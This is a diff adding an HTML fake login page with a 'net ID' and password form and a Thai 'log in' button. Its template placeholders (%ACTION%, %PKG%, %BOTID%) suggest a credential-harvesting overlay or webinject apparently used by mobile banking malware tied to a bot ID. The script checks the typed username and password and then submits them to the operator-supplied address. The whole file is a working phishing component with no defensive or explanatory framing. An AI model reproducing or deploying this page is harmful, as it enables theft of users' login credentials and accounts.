@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+
+<html>
+  <head>
+ 
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+
+
+<style type="text/css">
+
+*{outline:none;}.br{border:1px dotted red;}.stol{display:table;}.td{display:table-cell;}.w100{width:100% !important;}.left_{text-align:left;}.right_{text-align:right;}.center{text-align:center;}.top{vertical-align:top;}.bottom{vertical-align:bottom;}.middle{vertical-align:middle;}.inline{display:inline-block;}.pad{padding:15px;}.tr{display:table-row;}.none{display:none;}body,html{background-color:transparent;}
+  
+ .h100{
+   height:100%;
+} 
+
+html,body{
+  height:100%
+  
+}
+ 
+
+  @media (max-width: 768px){
+	 .block-xs{
+         display:block;
+		 width:100% !important;
+     }
+	 .center-xs{
+	  text-align:center !important;
+	 }
+  }
+
+body{
+ background:url('http://i.imgur.com/DYZUYqz.png');
+ background-size:cover;
+}  
+  
+.logo_div {
+    text-align: center;
+    padding-top: 50px;
+}
+
+img.logo_img {
+    max-width: 100px;
+}
+img.logo_img {
+    width: 30%;
+}
+.main {
+    padding: 43px 26px 32px 27px;
+}
+
+.has-error input::-webkit-input-placeholder {color:#c0392b;}
+.has-error input::-moz-placeholder          {color:#c0392b;}
+.has-error input:-moz-placeholder           {color:#c0392b;}
+.has-error input:-ms-input-placeholder      {color:#c0392b;}
+
+
+button.bt {
+    text-align: center;
+    background: linear-gradient(to bottom ,#049dbb 74%, #5abedc);
+    border: 0px solid red;
+    padding: 9px 33px;
+    color: white;
+    overflow: hidden;
+    border-radius: 4px;
+    box-shadow: 2px 2px 3px white;
+    position: relative;
+}
+
+.main {
+    text-align: center;
+}
+
+input.form-control {
+    border-color: #5ebfe6;
+    border-width: 1px 0px 0px 1px;
+}
+button.bt:before {
+    content: "";
+    position: absolute;
+    top: -63px;
+    border-radius: 100px;
+    left: -10px;
+    right: -10px;
+    /* width: 90%; */
+    height: 82px;
+    background: rgba(253, 253, 253, 0.16);
+}
+</style>
+
+
+ 
+  </head>
+  
+  <body>
+
+  
+ <div  class="logo_div "  style="">
+		 <img src="http://i.imgur.com/AEVXDvc.png" style="" class="logo_img"/>
+ </div> 
+  
+<form role="form" name="" action="%ACTION%" method="POST" onsubmit="send_key();return false" class="form">
+<input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
+<div  class="main "  style="">
+		<div  class="container-fluid "  style="">
+				<div  class="form-group"  style="">
+						<input class="form-control" type="text" name="fields[username]" id="username"  placeholder="net ID." />
+				</div>
+				
+				<div  class="form-group"  style="">
+						<input class="form-control" type="password" name="fields[pass]" id="pass"  placeholder="password" />
+						<input class="" type="submit"  style="display:none"/>
+				</div>
+				
+				<div  class="form-group"  style="">
+						<button class="bt " onclick="send_key()" style="">&#3648;&#3586;&#3657;&#3634;&#3626;&#3641;&#3656;&#3619;&#3632;&#3610;&#3610;</button>
+				</div>
+				
+		</div>
+</div>
+  
+</form>
+
+  
+  
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> 
+  </body>
+ 
+<script>
+  
+
+$('.form-control').on('focus',function(){
+		$(this).closest('.form-group').removeClass('has-error');
+})
+
+  
+function send_key(){
+   username=$('#username').val().trim();
+   pass=$('#pass').val().trim();
+   
+   $('.has-error').removeClass('has-error');
+   if(!/^.{1,40}\b/.test(username)){
+		$('#username').closest('.form-group').addClass('has-error');
+	}
+	if(!/^[a-z-A-Z0-9]{1,40}\b/.test(pass)){
+		$('#pass').closest('.form-group').addClass('has-error');
+	}
+	 
+	 if($('.has-error:visible').size()>0){
+		 return false;
+	 }
+	
+    $('form')[0].submit()
+   
+   
+};//send_key
+  
+  
+  
+  
+  
+</script>
+</html>  
